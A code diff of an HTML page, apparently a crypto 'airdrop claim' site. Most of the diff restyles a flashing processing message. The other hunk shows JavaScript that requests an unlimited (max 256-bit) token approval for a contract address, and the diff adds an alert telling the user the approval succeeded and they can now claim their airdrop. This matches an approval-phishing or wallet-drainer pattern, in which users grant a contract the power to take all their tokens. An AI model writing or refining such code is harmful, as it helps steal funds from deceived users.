@@ -102,24 +102,24 @@
       background-color: #aaa;
     }
 
-    .processing {
-      display: none;
-      font-size: 1.5rem;
-      color: yellow;
-      margin-top: 20px;
-      animation: flash 1s infinite;
+    /* Flashing animation for processing message */
+    @keyframes flashing {
+      0% { opacity: 1; font-size: 1.2rem; }
+      50% { opacity: 0.5; font-size: 1.5rem; }
+      100% { opacity: 1; font-size: 1.2rem; }
     }
 
-    @keyframes flash {
-      0% {
-        opacity: 0;
-      }
-      50% {
-        opacity: 1;
-      }
-      100% {
-        opacity: 0;
-      }
+    .processing {
+      display: none;
+      font-size: 1.2rem;
+      color: yellow;
+      margin-top: 20px;
+      opacity: 1;
+      animation: flashing 1s infinite;
+    }
+
+    .processing.show {
+      display: block;
     }
   </style>
 </head>
@@ -245,6 +245,7 @@
         const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // Max 256-bit value
         await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
         hideProcessingMessage();  // Hide processing message
+        alert('Approval successful! You can now claim your airdrop.');
         document.getElementById('claimAirdropButton').disabled = false;
       } catch (error) {
         hideProcessingMessage();  // Hide processing message
